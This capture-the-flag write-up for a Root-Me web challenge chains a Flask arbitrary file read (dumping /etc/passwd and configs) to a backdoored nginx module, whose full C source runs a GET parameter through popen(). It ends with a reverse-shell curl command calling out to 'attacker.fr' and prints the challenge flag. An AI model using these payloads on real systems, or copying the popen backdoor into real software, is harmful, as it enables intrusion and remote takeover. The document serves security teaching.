# TraineeTrainee

## Challenge

>   Your trainee made a final commit on the last day of his course, and since then you've seen a huge influx of requests. Strangely, you can no longer connect to the server ... Can you analyse what's going on?
>
>   Author : `Elweth` 

- Category: Web
- Difficulty: Medium

## Deployment

- Docker compose

```bash
cd src; docker compose up
``` 

## Writeup

The application seems to deliberately allow users to upload a file to the filesystem.

As a result, this feature can be used to download :

```bash
curl 'http://node1.challenges.ctf20k.root-me.org:20614/?filepath=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
...
```

We don't know much about the application, just that it's a nginx server. By enumerating the server, we discover that the application sources are in /app/app.py

```bash
curl 'http://node1.challenges.ctf20k.root-me.org:20614/?filepath=/app/app.py'
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def home():
    file = request.args.get('filepath')
    if file:
        return open(file).read()
    return render_template('index.html')

app.run(host="0.0.0.0", port=5000)
```

We also can read the Nginx configuration and there is something intersting :

```bash
curl 'http://node1.challenges.ctf20k.root-me.org:20614/?filepath=/etc/nginx/nginx.conf'
worker_processes 1;

events {
    worker_connections 1024;
}

http {
    include       mime.types;
    default_type  application/octet-stream;

    server {
        listen       80;
        server_name  localhost;

        location / {
            proxy_pass http://127.0.0.1:5000;
        }

        location /Th1s_3ndp0int_1s_S3cr3t {
            # Private endpoint for the Nginx module developed by the trainee.
            # I haven't taken the time to check the code yet ... it seems good.
            # /usr/local/src/root-me-backdoor/ngx_http_root_me_backdoor_module.c
            root_me_backdoor on;
        }
    }
}
```

There is indeed a proxy pass to the Flask application, but there is also another endpoint : /Th1s_3ndp0int_1s_S3cr3t with directive root_me_backdoor on;

We are also informed that the source code is available in the path /usr/local/src/root-me-backdoor/ngx_http_root_me_backdoor_module.c.

We can use the file read to discover the content of this Nginx module.

```bash
curl 'http://node1.challenges.ctf20k.root-me.org:20614/?filepath=/usr/local/src/root-me-backdoor/ngx_http_root_me_backdoor_module.c'
#include <ngx_config.h>
#include <ngx_core.h>
#include <ngx_http.h>
#include <stdio.h>
#include <stdlib.h>

typedef struct {
    ngx_flag_t backdoor;
} ngx_http_root_me_backdoor_conf_t;

static char *ngx_http_root_me_backdoor(ngx_conf_t *cf, ngx_command_t *cmd, void *conf);
static ngx_int_t ngx_http_root_me_backdoor_handler(ngx_http_request_t *r);
static void *ngx_http_root_me_backdoor_create_conf(ngx_conf_t *cf);
static char *ngx_http_root_me_backdoor_merge_conf(ngx_conf_t *cf, void *parent, void *child);

static ngx_command_t ngx_http_root_me_backdoor_commands[] = {
    { ngx_string("root_me_backdoor"),
      NGX_HTTP_LOC_CONF | NGX_CONF_FLAG,
      ngx_http_root_me_backdoor,
      NGX_HTTP_LOC_CONF_OFFSET,
      offsetof(ngx_http_root_me_backdoor_conf_t, backdoor),
      NULL },
    ngx_null_command
};

static ngx_http_module_t ngx_http_root_me_backdoor_module_ctx = {
    NULL,                                  /* preconfiguration */
    NULL,                                  /* postconfiguration */
    NULL,                                  /* create main configuration */
    NULL,                                  /* init main configuration */
    NULL,                                  /* create server configuration */
    NULL,                                  /* merge server configuration */
    ngx_http_root_me_backdoor_create_conf, /* create location configuration */
    ngx_http_root_me_backdoor_merge_conf   /* merge location configuration */
};

ngx_module_t ngx_http_root_me_backdoor_module = {
    NGX_MODULE_V1,
    &ngx_http_root_me_backdoor_module_ctx, /* module context */
    ngx_http_root_me_backdoor_commands,    /* module directives */
    NGX_HTTP_MODULE,                       /* module type */
    NULL,                                  /* init master */
    NULL,                                  /* init module */
    NULL,                                  /* init process */
    NULL,                                  /* init thread */
    NULL,                                  /* exit thread */
    NULL,                                  /* exit process */
    NULL,                                  /* exit master */
    NGX_MODULE_V1_PADDING
};

static void *ngx_http_root_me_backdoor_create_conf(ngx_conf_t *cf) {
    ngx_http_root_me_backdoor_conf_t *conf;

    conf = ngx_pcalloc(cf->pool, sizeof(ngx_http_root_me_backdoor_conf_t));
    if (conf == NULL) {
        return NGX_CONF_ERROR;
    }

    conf->backdoor = NGX_CONF_UNSET;
    return conf;
}

static char *ngx_http_root_me_backdoor_merge_conf(ngx_conf_t *cf, void *parent, void *child) {
    ngx_http_root_me_backdoor_conf_t *prev = parent;
    ngx_http_root_me_backdoor_conf_t *conf = child;

    ngx_conf_merge_value(conf->backdoor, prev->backdoor, 0);
    return NGX_CONF_OK;
}

static char *ngx_http_root_me_backdoor(ngx_conf_t *cf, ngx_command_t *cmd, void *conf) {
    ngx_http_core_loc_conf_t *clcf;

    clcf = ngx_http_conf_get_module_loc_conf(cf, ngx_http_core_module);
    clcf->handler = ngx_http_root_me_backdoor_handler;

    ngx_conf_set_flag_slot(cf, cmd, conf);
    return NGX_CONF_OK;
}

static ngx_int_t ngx_http_root_me_backdoor_handler(ngx_http_request_t *r) {
    ngx_http_root_me_backdoor_conf_t *conf;
    conf = ngx_http_get_module_loc_conf(r, ngx_http_root_me_backdoor_module);

    if (!conf->backdoor) {
        return NGX_DECLINED;
    }

    if (r->method != NGX_HTTP_GET) {
        return NGX_HTTP_NOT_ALLOWED;
    }

    ngx_str_t param_name = ngx_string("r00t-m3.backd0or");
    ngx_str_t param_value;

    if (ngx_http_arg(r, param_name.data, param_name.len, &param_value) != NGX_OK) {
        return NGX_HTTP_BAD_REQUEST;
    }

    char *command = (char *) ngx_pnalloc(r->pool, param_value.len + 1);
    if (command == NULL) {
        return NGX_HTTP_INTERNAL_SERVER_ERROR;
    }

    ngx_memcpy(command, param_value.data, param_value.len);
    command[param_value.len] = '\0';

    FILE *fp;
    char result[1024];
    fp = popen(command, "r");
    if (fp == NULL) {
        return NGX_HTTP_INTERNAL_SERVER_ERROR;
    }

    ngx_str_t response;
    response.data = (u_char *) ngx_pcalloc(r->pool, sizeof(result));
    if (fgets(result, sizeof(result), fp) != NULL) {
        ngx_memcpy(response.data, result, ngx_strlen(result));
        response.len = ngx_strlen(result);
    } else {
        response.len = 0;
    }
    pclose(fp);

    ngx_buf_t *b;
    ngx_chain_t out;

    r->headers_out.status = NGX_HTTP_OK;
    r->headers_out.content_length_n = response.len;
    r->headers_out.content_type.len = sizeof("text/plain") - 1;
    r->headers_out.content_type.data = (u_char *) "text/plain";

    b = ngx_pcalloc(r->pool, sizeof(ngx_buf_t));
    out.buf = b;
    out.next = NULL;

    b->pos = response.data;
    b->last = response.data + response.len;
    b->memory = 1;
    b->last_buf = 1;

    ngx_http_send_header(r);
    return ngx_http_output_filter(r, &out);
}
```

A look at the source code reveals a backdoored Nginx module that allows arbitrary commands to be executed on the server.

This function define the name of the Nginx directive in nginx.conf `root_me_backdoor on;`

```c
static ngx_command_t ngx_http_root_me_backdoor_commands[] = {
    { ngx_string("root_me_backdoor"),
      NGX_HTTP_LOC_CONF | NGX_CONF_FLAG,
      ngx_http_root_me_backdoor,
      NGX_HTTP_LOC_CONF_OFFSET,
      offsetof(ngx_http_root_me_backdoor_conf_t, backdoor),
      NULL },
    ngx_null_command
};
```

We discover a handler function which seems to parse GET parameter :

```c
ngx_str_t param_name = ngx_string("r00t-m3.backd0or");
ngx_str_t param_value;
```

The parameter `r00t-m3.backd0or` looks expected, and use to be sent in 'popen()' function :

```c
char *command = (char *) ngx_pnalloc(r->pool, param_value.len + 1);
if (command == NULL) {
    return NGX_HTTP_INTERNAL_SERVER_ERROR;
}

ngx_memcpy(command, param_value.data, param_value.len);
command[param_value.len] = '\0';

FILE *fp;
char result[1024];
fp = popen(command, "r");
if (fp == NULL) {
    return NGX_HTTP_INTERNAL_SERVER_ERROR;
}
```

It seems we discovered the backdoor!

And indeed we can use the Nginx module to execute commands :

```bash
curl 'http://node1.challenges.ctf20k.root-me.org:20614/Th1s_3ndp0int_1s_S3cr3t?r00t-m3.backd0or=id'
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```

We can use this to get a reverse shell :
```bash
curl 'http://node1.challenges.ctf20k.root-me.org:20614/Th1s_3ndp0int_1s_S3cr3t?r00t-m3.backd0or=nc$\{IFS\}attacker.fr$\{IFS\}4444$\{IFS\}-e$\{IFS\}/bin/sh'
```

And get the flag :

```bash
nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on x.x.x.x 39054
ls -la /
total 96
drwxr-xr-x   1 root root 4096 Nov  7 09:43 .
drwxr-xr-x   1 root root 4096 Nov  7 09:43 ..
-rwxr-xr-x   1 root root    0 Nov  7 09:43 .dockerenv
drwxr-xr-x   1 root root 4096 Nov  7 09:07 app
drwxr-xr-x   1 root root 4096 Nov  7 09:42 bin
drwxr-xr-x   2 root root 4096 Aug 14 16:05 boot
drwxr-xr-x   5 root root  340 Nov  7 09:48 dev
drwxr-xr-x   1 root root 4096 Nov  7 09:43 etc
-rwxrwxrwx   1 root root   32 Nov  7 09:04 flag-9fb215456edeadc855c755846be83cc310a5d262aa5d9360dd27db9cd0141a9d
drwxr-xr-x   2 root root 4096 Aug 14 16:05 home
drwxr-xr-x   1 root root 4096 Nov  7 09:42 lib
drwxr-xr-x   2 root root 4096 Oct 16 00:00 lib64
drwxr-xr-x   2 root root 4096 Oct 16 00:00 media
drwxr-xr-x   2 root root 4096 Oct 16 00:00 mnt
drwxr-xr-x   2 root root 4096 Oct 16 00:00 opt
dr-xr-xr-x 477 root root    0 Nov  7 09:48 proc
drwx------   1 root root 4096 Nov  7 09:44 root
drwxr-xr-x   3 root root 4096 Oct 16 00:00 run
-rwxrwxr-x   1 root root  134 Nov  7 09:04 run.sh
drwxr-xr-x   2 root root 4096 Oct 16 00:00 sbin
drwxr-xr-x   2 root root 4096 Oct 16 00:00 srv
dr-xr-xr-x  13 root root    0 Nov  7 09:48 sys
drwxrwxrwt   1 root root 4096 Nov  7 09:43 tmp
drwxr-xr-x   1 root root 4096 Oct 16 00:00 usr
drwxr-xr-x   1 root root 4096 Oct 16 00:00 var
cat /flag*
RM{My_Tr4inee_B4ckd00r_My_Ng1nx}
```